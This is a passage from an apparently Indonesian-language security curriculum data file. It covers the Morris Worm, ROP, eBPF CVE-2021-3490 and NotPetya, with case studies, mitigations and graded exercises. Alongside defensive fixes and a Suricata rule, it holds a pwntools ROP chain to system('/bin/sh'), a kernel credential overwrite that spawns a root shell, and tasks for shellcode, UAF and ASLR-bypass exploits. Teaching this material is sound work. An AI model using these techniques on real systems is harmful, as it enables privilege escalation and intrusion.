- **Akar Masalah Rekayasa Perangkat Lunak & Bahasa Pemrograman C**: Salah satu vektor infeksi utama Morris Worm adalah celah *stack buffer overflow* pada daemon sistem UNIX `fingerd` (layanan informasi profil pengguna jaringan pada port 79). Pada implementasi BSD 4.3, fungsi `main()` mendeklarasikan buffer lokal berukuran tetap: `char line[512];`. Untuk membaca permintaan nama pengguna dari soket jaringan, programmer menggunakan fungsi pustaka standar C `gets(line);`. Fungsi `gets()` secara inheren tidak aman karena tidak menerima parameter batas ukuran buffer; fungsi tersebut terus menulis byte masukan dari jaringan ke dalam stack hingga menemukan karakter newline atau EOF. Morris menyusun string payload masukan sepanjang 536 byte yang sengaja meluap melampaui buffer 512 byte, menimpa *Saved Frame Pointer* dan *Saved Return Address* pada stack frame, lalu mengarahkan alur eksekusi CPU langsung ke instruksi *shellcode* yang mengeksekusi `/bin/sh` dengan hak akses root.""",
            "snippet": r"""```c
// Kode Sumber Daemon BSD 4.3 fingerd yang Rentan (1988)
#include <stdio.h>

int main(int argc, char *argv[]) {
    char line[512]; // Alokasi buffer 512 byte pada stack frame
    
    // CACAT HISTORIS FATAL: gets() tidak memiliki batasan panjang masukan!
    // Membaca masukan jaringan tanpa batas hingga menemui newline ('\n')
    gets(line); 
    
    // Jika masukan > 512 byte, byte ke-513 dan seterusnya akan menimpa
    // Saved Base Pointer (RBP) dan Saved Return Address (RIP) di stack!
    return 0; // Saat instruksi RET dieksekusi, CPU melompat ke alamat yang disuntikkan penyerang!
}

// REKAYASA DEFENSIVE MODERN: Mengganti gets() dengan fgets() dengan Batas Maksimum
int main_safe(int argc, char *argv[]) {
    char line[512];
    
    // AMAN: Membatasi pembacaan masukan maksimum sesuai ukuran riil buffer (sizeof)
    if (fgets(line, sizeof(line), stdin) == NULL) {
        return -1; // Penanganan galat pembacaan stream
    }
    
    return 0; // Eksekusi aman terjamin dari stack corruption
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Morris Worm mendorong standarisasi keselamatan memori dalam ilmu komputer: (1) Fungsi `gets()` secara resmi dihapus dari standar bahasa pemrograman C ISO C11 (ISO/IEC 9899:2011) dan dinyatakan terlarang di seluruh compiler modern; (2) Kompiler mengadopsi mekanisme proteksi otomatis **Stack Canaries (`-fstack-protector-all`)** yang menyisipkan nilai acak sebelum return address untuk mendeteksi penimpaan buffer sebelum `ret` dieksekusi; (3) Sistem operasi dan prosesor modern menerapkan proteksi perangkat keras **Data Execution Prevention (DEP / NX Bit)** yang menandai memori stack dan heap sebagai non-executable (W^X / Write XOR Execute), mencegah eksekusi shellcode di stack."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Tulis program C sederhana yang mengalokasikan buffer stack `char buffer[64]`. Kompilasi dengan GCC menggunakan flag `-fno-stack-protector -z execstack` untuk mematikan mitigasi keamanan. Tulis skrip Python untuk menghasilkan payload crash yang menimpa return address dengan string pola `0x41414141` ('AAAA'), dan konfirmasi terjadinya crash `Segmentation fault (core dumped)` di GDB.
- **Petunjuk Perancangan Arsitektur**:
  - Periksa tata letak stack frame menggunakan `gdb ./vuln`: hitung jarak offset dari awal buffer hingga ke register `$rip` (biasanya 64 byte buffer + 8 byte saved RBP = 72 byte).
  - Susun payload: `b"A" * 72 + b"\xef\xbe\xad\xde"` (`0xDEADBEEF`).
- **Test Vector & Kasus Uji**:
  - Jalankan di bawah GDB: program harus crash tepat pada instruksi `ret` dengan nilai register `RIP: 0xdeadbeef`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Perhitungan offset stack presisi 100%, crash reproduktif di GDB dengan alamat RIP target.
  - Skor 50%: Program crash tetapi register RIP tertimpa nilai acak karena kesalahan perhitungan offset padding.
  - Skor 0%: Program tidak mengalami crash karena gagal mematikan compiler protection.

### Tingkat 2: Menengah
- **Tugas**: Bangun generator *Shellcode* x86-64 bebas Null-Byte (`\x00`) dalam Assembly NASM yang mengeksekusi syscall `execve("/bin/sh", NULL, NULL)`. Pastikan shellcode dapat disuntikkan ke dalam fungsi berbasis string C (`strcpy`/`gets`) tanpa terpotong prematur oleh karakter null terminator.
- **Petunjuk Perancangan Arsitektur**:
  - Hindari opcode yang memuat byte nol: gunakan instruksi `xor eax, eax` alih-alih `mov eax, 0`.
  - Dorong string `//bin/sh` (8 byte) ke dalam stack: `movabs rbx, 0x68732f2f6e69622f; push rbx`.
  - Setel register syscall: RAX = 59 (`sys_execve`), RDI = pointer ke string stack, RSI = 0, RDX = 0.
- **Test Vector & Kasus Uji**:
  - Uji kemurnian shellcode: `assert b"\x00" not in shellcode_bytes`.
  - Eksekusi shellcode di dalam wrapper pengujian memori executable C: shellcode harus memunculkan shell `/bin/sh` interaktif.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Shellcode bebas null-byte sepenuhnya, ukuran ringkas ($< 35$ byte), eksekusi shell bersih.
  - Skor 50%: Shellcode berhasil mengeksekusi shell tetapi masih memuat satu atau lebih null-byte.
  - Skor 0%: Shellcode mengalami crash dengan Illegal Instruction (SIGILL).

### Tingkat 3: Mahir
- **Tugas**: Rancang eksploit Heap Exploitation klasik (*Use-After-Free & Fastbin/Tcache Poisoning*) dalam C/Python di atas glibc 2.31: Simulasikan dua struktur objek heap di mana objek pertama dibebaskan (`free()`), pointer dangling dialokasikan ulang oleh objek penyerang, dan pointer fungsi virtual (*vtable*) dibajak untuk mengarahkan eksekusi ke fungsi rahasia `win()`.
- **Petunjuk Perancangan Arsitektur**:
  - Alokasikan Chunk A (32 byte) dan Chunk B (32 byte). Bebaskan Chunk A tanpa menyetel pointernya ke `NULL` (Use-After-Free).
  - Alokasikan Chunk C dengan ukuran yang sama: glibc tcache allocator akan memberikan kembali alamat memori Chunk A ke Chunk C.
  - Tulis payload ke Chunk C yang menimpa function pointer yang masih dibaca oleh referensi lama Chunk A.
- **Test Vector & Kasus Uji**:
  - Jalankan alur alokasi, free, re-alokasi, lalu panggil pemanggilan fungsi via pointer lama Chunk A.
  - Program harus mengeksekusi fungsi `win()` dan mencetak "SUCCESS: Control Flow Hijacked via UAF!".
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Eksploitasi tcache/UAF berhasil, manipulasi struktur heap deterministik, pemahaman glibc allocator mendalam.
  - Skor 50%: Berhasil melakukan overwrite tetapi program crash sebelum fungsi target selesai dieksekusi.
  - Skor 0%: Memori di-double-free tanpa memanfaatkan dangling pointer."""
    },
    179: {
        "trace": r"""#### Tabel Penelusuran Rantai ROP (Return-Oriented Programming) Melompati Mitigasi DEP/NX
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Deteksi Mitigasi DEP/NX | Header Biner ELF (GNU_STACK) | Flag stack RW- (Non-Executable) | Shellcode yang disuntikkan ke stack ditolak eksekusi oleh CPU (SIGSEGV) | CPU hardware NX-bit aktif | Injeksi shellcode tradisional gagal total |
| 2. Pindai Gadget Memori Legal | Segmen Kode `.text` Biner / Libc | Instruksi legal berakhiran opcode `ret` (`0xC3`) | Penyerang mencari potongan: `pop rdi; ret` dan `pop rsi; ret` | Gadget berada di area memori berizin r-x | Gadget legal diizinkan dieksekusi oleh hardware |
| 3. Konstruksi Rantai ROP | Memori Stack Frame Terkorupsi | Rentetan alamat gadget ROP | Padding buffer + Alamat Gadget 1 + Nilai Register + Alamat Gadget 2 | RSP menunjuk ke alamat Gadget 1 pada stack | Alur kontrol berpindah dari satu gadget ke gadget berikutnya |
| 4. Setup Parameter Pemanggilan | Register x86-64 CPU | Alamat string `"/bin/sh"` di memori Libc | Gadget 1 mengeksekusi: `pop rdi; ret` memuat alamat string ke RDI | RDI = alamat `"/bin/sh"` (Argumen 1 fungsi) | Konvensi panggilan System V ABI terpenuhi |
| 5. Eksekusi `system()` / `mprotect()` | Pustaka Standar C (glibc) | Alamat fungsi `system@plt` atau `system` | Eksekusi melompat ke awal fungsi `system` dengan parameter sah | RIP = `&system`, RSP seimbang | Shell interaktif terbuka tanpa mengeksekusi satu byte pun di stack! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Kemunculan Serangan Return-Oriented Programming (ROP) Melumpuhkan Mitigasi Hardware DEP/NX (2010)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Ketika Microsoft Windows XP SP2 dan sistem operasi Linux modern mulai mengaktifkan proteksi perangkat keras Data Execution Prevention (DEP / NX-bit) pada pertengahan 2000-an, industri meyakini bahwa era eksploitasi memori telah berakhir karena CPU menolak mengeksekusi instruksi pada segmen stack dan heap. Namun pada awal 2010 (termasuk pada serangan Operasi Aurora terhadap Google dan Adobe / CVE-2010-0249), peretas membuktikan keberhasilan teknik **Return-Oriented Programming (ROP)**.
- **Akar Masalah Arsitektur Komputer & Rekayasa Alur Eksekusi**: Gagasan ROP memanfaatkan fakta bahwa biner yang sedang berjalan dan pustaka bersama dinamis (`libc.so` atau `ntdll.dll`) sudah memuat jutaan instruksi mesin legal di dalam segmen memori yang sah untuk dieksekusi (*Read-Execute*). Penyerang tidak lagi menyuntikkan instruksi baru; sebaliknya, mereka mencari potongan instruksi pendek yang berakhiran instruksi `ret` (disebut *gadget*, misalnya `pop rdi; ret`). Dengan menyusun daftar alamat-alamat gadget ini di dalam stack yang telah dikorupsi melalui buffer overflow, instruksi `ret` pada akhir setiap gadget akan menarik (*pop*) alamat gadget berikutnya ke dalam register instruction pointer (`RIP`). Rantai gadget ini dapat dirangkai untuk memanggil fungsi pembuat shell seperti `system("/bin/sh")` atau mengubah izin memori stack menjadi executable melalui panggilan `mprotect()`, meruntuhkan efektivitas mitigasi DEP secara total.""",
            "snippet": r"""```python
# Analisis Rekonstruksi Eksploitasi ROP Menggunakan Pwntools
from pwn import *

def construct_rop_chain(elf_binary, libc_binary):
    '''
    Menyusun rantai ROP untuk memanggil system("/bin/sh")
    pada biner dengan proteksi NX aktif (Non-Executable Stack).
    '''
    # 1. Alokasi Padding untuk mencapai Saved RIP
    offset = 72 # 64 byte buffer + 8 byte saved RBP
    payload = b"A" * offset
    
    # 2. Inisialisasi Generator ROP dari biner ELF
    rop = ROP(elf_binary)
    
    # 3. Gadget: pop rdi; ret (Memuat argumen pertama sesuai SysV ABI x86-64)
    pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
    
    # 4. Cari alamat string "/bin/sh" dan fungsi system() di libc
    bin_sh_address = next(libc_binary.search(b"/bin/sh\x00"))
    system_address = libc_binary.symbols['system']
    
    # 5. Rangkai ROP Chain pada Stack
    payload += p64(pop_rdi_gadget)  # RIP melompat ke 'pop rdi; ret'
    payload += p64(bin_sh_address)   # Nilai yang akan di-pop ke register RDI
    payload += p64(system_address)   # RIP melompat ke system(rdi)
    
    return payload # DEP/NX hardware mitigation berhasil dilompati!
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Penemuan ROP memicu perlombaan senjata keamanan siber generasi baru: (1) Adopsi universal **Address Space Layout Randomization (ASLR)** yang mengacak alamat dasar pustaka libc pada setiap kali program dijalankan, memaksa penyerang menemukan celah kebocoran memori (*information leak*) terlebih dahulu sebelum dapat menyusun rantai ROP; (2) Implementasi mitigasi perangkat keras generasi terbaru seperti **Intel Control-flow Enforcement Technology (CET)** dan **ARM Pointer Authentication (PAC)** yang menggunakan *Shadow Stack* perangkat keras dan tanda tangan kriptografis pointer untuk memvalidasi bahwa return address tidak dimanipulasi di stack."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Gunakan utilitas baris perintah Linux `checksec` atau skrip Python untuk memeriksa status mitigasi keamanan biner ELF: Stack Canary, NX/DEP (No-Execute), PIE (Position Independent Executable), RELRO (Relocation Read-Only), dan FORTIFY_SOURCE.
- **Petunjuk Perancangan Arsitektur**:
  - Periksa segmen header ELF: segmen `GNU_STACK` flag `RW` (NX aktif) vs `RWE` (NX mati).
  - Periksa `DT_BIND_NOW` pada segmen `.dynamic` untuk Full RELRO.
  - Periksa simbol fungsi `__stack_chk_fail` untuk deteksi Stack Canary.
- **Test Vector & Kasus Uji**:
  - Biner A: Dikompilasi dengan `gcc -no-pie -fno-stack-protector -z execstack`. Hasil: NX=Disabled, Canary=No, PIE=No.
  - Biner B: Dikompilasi dengan `gcc -fstack-protector-all -Wl,-z,relro,-z,now -pie`. Hasil: NX=Enabled, Canary=Yes, PIE=Yes, Full RELRO.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Deteksi kelima status mitigasi akurat dengan parsing header ELF biner langsung.
  - Skor 50%: Hanya mengandalkan pemanggilan subproses eksternal `checksec` tanpa implementasi parsing internal.
  - Skor 0%: Salah mendeteksi status NX bit.

### Tingkat 2: Menengah
- **Tugas**: Bangun rantai ROP sederhana (ret2win) dalam Python menggunakan `pwntools` untuk biner ELF x86-64 tanpa PIE: Rantai ROP harus memanipulasi register RDI dan RSI dengan memanggil gadget `pop rdi; ret` dan `pop rsi; pop r15; ret` untuk memenuhi dua argumen fungsi rahasia `admin_console(0xCAFEBABE, 0xDEADFACE)`.
- **Petunjuk Perancangan Arsitektur**:
  - Ekstrak alamat fungsi `admin_console` dari tabel simbol ELF biner.
  - Cari gadget menggunakan parser ELF atau Ropper/ROPgadget.
  - Perhatikan keselarasan stack 16-byte SSE (*Stack Alignment*): sisipkan satu instruksi `ret` tambahan jika terjadi crash instruksi `movaps` di dalam fungsi target.
- **Test Vector & Kasus Uji**:
  - Jalankan eksploit terhadap biner uji lokal: biner harus mencetak pesan sukses "ACCESS GRANTED: Target authenticated with correct magic parameters!".
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Pemetaan gadget presisi, penanganan alignment stack 16-byte benar, parameter terpasang akurat di register.
  - Skor 50%: ROP chain benar namun crash pada instruksi `movaps` karena mengabaikan keselarasan stack 16-byte.
  - Skor 0%: Payload salah memuat argumen ke register.

### Tingkat 3: Mahir
- **Tugas**: Rancang eksploitasi Bypass ASLR penuh (Ret2Libc dua tahap) dalam Python/pwntools: Tahap 1 memanfaatkan format string vulnerability atau buffer overflow parsial untuk membocorkan alamat riil fungsi libc (`puts@got`) ke stdout; Tahap 2 menghitung *libc base address* secara dinamis, mengkalkulasi alamat riil fungsi `system()` dan string `"/bin/sh"`, lalu mengirimkan rantai ROP tahap kedua untuk mendapatkan shell interaktif.
- **Petunjuk Perancangan Arsitektur**:
  - Tahap 1: Susun ROP chain untuk memanggil `puts(puts@got)` lalu melompat kembali ke `main()` untuk menerima payload kedua.
  - Hitung alamat dasar libc: $\text{Libc Base} = \text{Alamat Puts Bocor} - \text{Offset Puts di Libc Database}$.
  - Tahap 2: Kirim payload ROP final: `pop_rdi + bin_sh + system`.
- **Test Vector & Kasus Uji**:
  - Jalankan terhadap server biner Linux lokal dengan proteksi ASLR aktif (`kernel.randomize_va_space = 2`).
  - Eksploit harus berhasil mendapatkan akses shell dalam satu sesi koneksi socket TCP tanpa crash.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Eksploit dua tahap berjalan mulus di bawah proteksi ASLR penuh, penanganan kalkulasi offset dinamis presisi.
  - Skor 50%: Berhasil membocorkan alamat libc namun gagal pada tahap eksekusi shell kedua karena koneksi terputus.
  - Skor 0%: Mengasumsikan alamat libc statis tanpa bypass ASLR."""
    },
    180: {
        "trace": r"""#### Tabel Penelusuran Eksploitasi Kernel Linux eBPF Out-of-Bounds (CVE-2021-3490)
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Pemuatan Bytecode eBPF | Syscall `bpf(BPF_PROG_LOAD)` | Program eBPF rakitan pengguna non-root | Operasi bitwise 32-bit: `BPF_ALU32_REG` pada register R1 | Verifier kernel memvalidasi batasan nilai register | Verifier salah melacak rentang nilai minimum & maksimum register! |
| 2. Eksploitasi Bug Verifier | Kernel `kernel/bpf/verifier.c` | Trik manipulasi batasan matematika | Verifier percaya nilai register bernilai konstan 0, padahal bernilai riil 1 | Register BPF R1 memuat nilai di luar jangkauan izin verifier | Verifier kernel tertipu dan meloloskan bytecode berbahaya |
| 3. Akses Out-of-Bounds Memori | Array Peta eBPF (BPF Map) | Offset pointer melampaui ukuran array | Aritmatika pointer BPF: `ptr + R1 * 0x1000` | Pointer membaca/menulis memori kernel di luar batas peta array | Kemampuan Arbitrary Kernel Read/Write primitif tercapai |
| 4. Pencarian Struktur Kredensial | Ruang Memori Kernel Linux | Penelusuran pointer `task_struct` proses | Melacak struktur `current->cred` pada memori kernel proses saat ini | Pointer `struct cred` proses penyerang ditemukan di RAM | Lokasi UID, GID, EUID, EGID proses terpetakan |
| 5. Eskalasi Hak Akses Root | Modul Eksploitasi Ring 0 | Penulisan nilai 0 ke field `uid/gid` | `current->cred->uid = 0; current->cred->euid = 0;` | Register kernel mengonfirmasi hak akses root penuh | Proses biasa langsung berubah menjadi `root (UID 0)` tanpa jejak password! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Ekskalasi Hak Akses Root Kernel Linux via Celah Logika Verifier eBPF (CVE-2021-3490)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada Mei 2021, peneliti keamanan Manfred Paul menemukan celah eskalasi hak akses (*Local Privilege Escalation / LPE*) kritis pada subsistem extended Berkeley Packet Filter (eBPF) kernel Linux (CVE-2021-3490). Celah ini memungkinkan pengguna biasa tanpa wewenang (*unprivileged user*) untuk membobol keamanan kernel Ring 0 dan mendapatkan kontrol root instan pada server Ubuntu, Debian, dan Fedora.
- **Akar Masalah Rekayasa Kernel & Pelacakan Batas Register**: eBPF dirancang agar pengguna dapat menjalankan kode mikro di dalam ruang memori kernel secara aman melalui mekanisme verifikasi statis (*eBPF verifier*). Verifier bertanggung jawab melacak batas rentang nilai minimum dan maksimum dari setiap register untuk mencegah akses memori out-of-bounds. Pada implementasi fungsi operasi bitwise 32-bit (`scalar32_min_max_and` / `or` / `xor`), terdapat kekeliruan logika matematika dalam memprediksi batasan register hasil operasi. Penyerang menyusun instruksi eBPF licik di mana verifier kernel menyimpulkan bahwa sebuah register pasti bernilai 0 (sehingga dianggap aman), padahal saat dieksekusi secara nyata oleh JIT compiler CPU, register tersebut memuat nilai berbeda. Perbedaan persepsi antara verifier dan CPU ini memungkinkan program eBPF membaca dan menulis memori kernel apa pun secara bebas (*arbitrary kernel read/write*), menimpa struktur kredensial `struct cred` proses penyerang menjadi UID 0 (root).""",
            "snippet": r"""```c
// Rekonstruksi Eksploitasi Kernel Linux: Penimpaan Kredensial task_struct menjadi Root (UID 0)
#include <stdint.h>
#include <unistd.h>

struct cred {
    int32_t usage;
    uint32_t uid;   // User ID
    uint32_t gid;   // Group ID
    uint32_t suid;  // Saved UID
    uint32_t sgid;  // Saved GID
    uint32_t euid;  // Effective UID -> INI TARGET PENYERANG!
    uint32_t egid;  // Effective GID
};

// Fungsi yang dieksekusi setelah mendapatkan primitif Arbitrary Kernel Write
void elevate_to_root(uint64_t cred_address_in_kernel) {
    // Menimpa nilai uid, gid, suid, sgid, euid, egid menjadi 0 (ROOT)
    uint32_t zero_ids[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    
    // Tulis ke memori kernel di offset cred->uid
    kernel_write_bytes(cred_address_in_kernel + 4, zero_ids, sizeof(zero_ids));
    
    // Verifikasi di ruang pengguna:
    if (getuid() == 0) {
        // SYSTEM SHELL ROOT BERHASIL DIDAPATKAN!
        execl("/bin/sh", "sh", NULL);
    }
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden eBPF CVE-2021-3490 mendorong reformasi drastis dalam tata kelola keamanan kernel Linux: (1) Distribusi Linux besar (Ubuntu, RedHat, Debian) kini secara default menonaktifkan eBPF untuk pengguna non-root (`kernel.unprivileged_bpf_disabled = 1`); (2) Pengenalan teknik verifikasi formal berbasis model matematis (*Formal Verification*) pada eBPF verifier untuk membuktikan secara matematis bahwa pelacakan rentang nilai register tidak memiliki celah logika; (3) Pengerasan struktur data keamanan kernel (`struct cred` dibuat read-only kecuali saat dimodifikasi via fungsi kernel sah `commit_creds`)."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Tulis modul kernel Linux sederhana (Loadable Kernel Module / LKM) dalam C yang mencetak alamat memori pointer `current` (`struct task_struct`) dan nilai UID proses saat ini ke ring buffer kernel dmesg saat modul di-load via `insmod`.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan header kernel: `<linux/init.h>`, `<linux/module.h>`, `<linux/sched.h>`, `<linux/cred.h>`.
  - Baca UID via makro `current_uid().val`.
  - Gunakan `pr_info()` untuk mencetak log ke dmesg.
- **Test Vector & Kasus Uji**:
  - Load modul: `sudo insmod test_module.ko`.
  - Jalankan `dmesg | tail -n 5`: Harus muncul log mencetak alamat `task_struct` (misal `0xffff888012345678`) dan `UID: 0`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Modul kernel terkompilasi bersih tanpa warning, mencetak alamat memori kernel dan UID dengan aman.
  - Skor 50%: Modul berfungsi namun memicu compiler warning akibat kesalahan header kernel.
  - Skor 0%: Modul memicu Kernel Panic (Oops) saat di-load.

### Tingkat 2: Menengah
- **Tugas**: Bangun program pemantau sistem berbasis eBPF (BCC / libbpf) dalam C/Python yang memasang kprobe pada syscall `sys_enter_execve`. Ekstrak nama biner yang dieksekusi, PID, dan UID proses, lalu filter secara otomatis setiap eksekusi biner yang mencurigakan (misal eksekusi shell dari dalam direktori `/tmp` atau `/dev/shm`).
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan helper eBPF `bpf_get_current_pid_tgid()` dan `bpf_get_current_uid_gid()`.
  - Baca string argumen path filename menggunakan `bpf_probe_read_user_str()`.
  - Kirim event ke user space melalui ring buffer atau perf event buffer.
- **Test Vector & Kasus Uji**:
  - Eksekusi biner normal `/bin/ls`: Detektor mencatat aktivitas dengan status NORMAL.
  - Eksekusi biner `/tmp/malicious_exploit`: Detektor harus segera mencetak peringatan merah: "ALERT: Suspicious execution detected from temporary directory by PID <pid>".
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Program eBPF lulus verifier kernel tanpa error, ekstraksi parameter string efisien tanpa memory leak.
  - Skor 50%: Program berjalan namun menggunakan fungsi pemindaian string yang boros CPU pada kernel space.
  - Skor 0%: Program ditolak oleh verifier kernel saat di-load.

### Tingkat 3: Mahir
- **Tugas**: Rancang simulator serangan Hardware Fault Injection (*Clock/Voltage Glitching*) dalam simulasi Python/C: Simulasikan CPU pipeline sederhana yang mengeksekusi instruksi perbandingan keamanan `if (user_is_authenticated == 1) grant_admin();`. Injeksi lonjakan tegangan (glitch) pada siklus clock spesifik untuk membalikkan bit flag register CPU atau melompati instruksi `jne/je` (*Skip Instruction Attack*).
- **Petunjuk Perancangan Arsitektur**:
  - Modelkan siklus pipeline: Fetch $\to$ Decode $\to$ Execute $\to$ Writeback.
  - Definisikan fungsi `inject_glitch(cycle_number, glitch_type)` yang memodifikasi Program Counter (PC) atau register status flags.
  - Implementasikan teknik pertahanan perangkat lunak tahan-glitch (*Glitch-Resistant Coding*): evaluasi ganda dengan variabel independen dan komparasi redundan (*Double-Check & Hardened Conditionals*).
- **Test Vector & Kasus Uji**:
  - Eksekusi kode naif tanpa glitch: Akses ditolak.
  - Eksekusi kode naif dengan glitch pada siklus ke-4: Glitch melompati perbandingan, akses admin terbuka ilegal!
  - Eksekusi kode hardened dengan perbandingan ganda independen: Glitch pada siklus ke-4 tetap gagal membuka akses admin dan memicu alarm `TAMPER_DETECTED`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Simulasi pipeline CPU dan injeksi glitch akurat, teknik mitigasi defensif hardened sukses menahan serangan.
  - Skor 50%: Simulasi glitch berhasil namun mitigasi defensif masih dapat ditembus oleh glitch kedua.
  - Skor 0%: Tidak ada pemodelan siklus clock instruksi."""
    },
    181: {
        "trace": r"""#### Tabel Penelusuran Eksploitasi Worm NotPetya via EternalBlue & Keruntuhan Jaringan Global Maersk
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Kompromi Update Software | Server Pajak Ukraina M.E.Doc | Paket update terinfeksi backdoor | Perangkat lunak akuntansi M.E.Doc mendownload modul NotPetya | Server korporat Ukraina terinfeksi otomatis | Backdoor aktif serempak di ribuan perusahaan multinasional |
| 2. Propagasi Internal Cepat | Jaringan Lokal Enterprise | Port TCP 445 (SMBv1) & PsExec | Eksploit EternalBlue (MS17-010) membanjiri buffer kernel SMB | Ring 0 kernel Windows terkompromi via groom pool | Infeksi melompat ke seluruh server Windows yang belum dipatch |
| 3. Pencurian Kredensial Memori | Layanan Subsistem Keamanan LSASS | Modul mini-Mimikatz memori dump | Ekstraksi hash NTLM dan plaintext password dari memori proses | Kredensial Domain Admin tersimpan di RAM | NotPetya menguasai akun Domain Controller Active Directory |
| 4. Penghancuran Disk MBR | Master Boot Record Sektor 0 | Payload wiper disk palsu | Sektor 0 hard disk ditimpa dengan bootloader enkripsi palsu XOR | Partisi NTFS dan MFT dikorupsi tanpa kunci pemulihan | Pesan tebusan palsu ditampilkan; data terhapus permanen! |
| 5. Pemadaman Logistik Global | Infrastruktur Raksasa Maersk | Seluruh Active Directory lumpuh | 45.000 PC dan 4.000 server padam dalam waktu 7 menit | Pelabuhan kontainer kapal di seluruh dunia macet | Kerugian $10 Miliar; restorasi via 1 DC offline di Ghana |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Bencana Serangan Siber NotPetya & Kelumpuhan Raksasa Logistik Maersk via EternalBlue (2017)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada 27 Juni 2017, serangan siber destruktif NotPetya menyapu dunia, melumpuhkan bank, bandara, rumah sakit, dan perusahaan multinasional besar. Korban paling terdampak adalah raksasa perkapalan global A.P. Moller-Maersk, yang menangani 20% logistik kontainer dunia. Dalam hitungan menit, seluruh 45.000 komputer desktop, 4.000 server fisik/virtual, dan ratusan jaringan pelabuhan Maersk di seluruh benua mati total, memicu kerugian ekonomi global melampaui $10 Miliar.
- **Akar Masalah Arsitektur Keamanan Jaringan & Propagasi Otomatis**: Meskipun menyamar sebagai ransomware, NotPetya sebenarnya adalah senjata siber destruktif (*wiper*) di mana proses dekripsi secara matematis mustahil dilakukan. Kecepatan penyebarannya yang menghancurkan disebabkan oleh kombinasi maut tiga elemen: (1) Penetrasi awal melalui rantai pasok pembaruan perangkat lunak pajak Ukraina M.E.Doc; (2) Propagasi lateral otomatis menggunakan eksploitasi kernel SMBv1 EternalBlue (MS17-010); (3) Alat pemanen kredensial memori LSASS terintegrasi yang mencuri token otentikasi administrator jaringan. Jaringan internal Maersk yang datar (*flat network topology*) tanpa segmentasi antar kantor wilayah memungkinkan NotPetya menyebar ke seluruh infrastruktur dunia dalam waktu kurang dari 10 menit. Maersk hanya terselamatkan karena satu-satunya Domain Controller yang tersisa dalam keadaan offline akibat pemadaman listrik di sebuah kantor cabang di Ghana.""",
            "snippet": r"""```text
# Aturan Deteksi Suricata / Snort IDS untuk Serangan Eksploit EternalBlue (SMBv1 Overflow)
alert tcp any any -> any 445 (
    msg:"ET EXPLOIT-KIT EternalBlue SMBv1 Trans2 Secondary Memory Grooming Attempt";
    flow:to_server,established;
    content:"|FF|SMB|32|"; offset:4; depth:5; 
    # Deteksi parameter SMB_COM_TRANSACTION2_SECONDARY dengan manipulasi byte displacement:
    content:"|00 00 00 00|"; distance:29; within:4;
    byte_test:2,>,1024,12,relative,little;
    classtype:attempted-admin;
    sid:2024218;
    rev:3;
    metadata:created_at 2017_05_12, cve CVE_2017_0144;
)
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: NotPetya menjadi studi kasus utama dalam desain ketahanan arsitektur perusahaan: (1) Implementasi **Zero Trust Architecture (ZTA)** dan mikrosegmentasi jaringan internal ketat—kantor cabang tidak boleh memiliki konektivitas langsung tanpa batas ke pusat data utama; (2) Penegakan manajemen kerentanan dan siklus patching darurat (*Emergency Patch Management*) untuk seluruh port administrasi internal; (3) Menonaktifkan protokol warisan yang rentan seperti SMBv1 di seluruh armada sistem operasi; (4) Menjaga cadangan data offline terisolasi (*Air-Gapped Immutable Backups*) yang tidak dapat diakses atau dienkripsi dari jaringan aktif."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Tulis parser log insiden keamanan dalam Python yang membaca berkas log akses web atau log firewall dalam format JSON/Syslog, mengidentifikasi alamat IP dengan frekuensi kegagalan autentikasi abnormal (misal $> 5$ kali percobaan gagal dalam 1 menit), dan mengekspor daftar blokir IP ke format aturan firewall `iptables` / `ufw`.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan `collections.defaultdict` dengan sliding-window timestamp untuk melacak jumlah percobaan per IP.
  - Generate perintah penolakan: `iptables -A INPUT -s <IP> -j DROP`.
- **Test Vector & Kasus Uji**:
  - Masukan log berisi 50 entri normal dan 10 entri gagal berurutan dari IP `198.51.100.42` dalam jendela waktu 30 detik.
  - Parser harus menghasilkan berkas `blocked_ips.sh` yang memuat perintah pemblokiran untuk `198.51.100.42`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Logika sliding-window akurat, parsing format log bersih, sintaksis perintah firewall benar.
